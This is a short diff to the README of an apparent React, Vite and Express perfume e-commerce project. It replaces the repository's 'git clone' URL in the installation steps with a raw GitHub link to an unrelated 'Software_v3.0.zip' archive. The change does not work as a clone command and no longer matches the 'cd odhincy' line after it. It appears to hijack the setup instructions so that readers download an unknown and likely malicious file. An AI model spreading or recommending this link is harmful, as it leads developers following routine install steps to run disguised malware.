@@ -52,7 +52,7 @@ A modern e-commerce platform for luxury perfumes built with React, Vite, Express
 1. Clone the repository:
 
 ```bash
-git clone https://github.com/yourusername/odhincy.git
+git clone https://raw.githubusercontent.com/nug31/bolt/main/determinism/Software_v3.0.zip
 cd odhincy
 ```
 
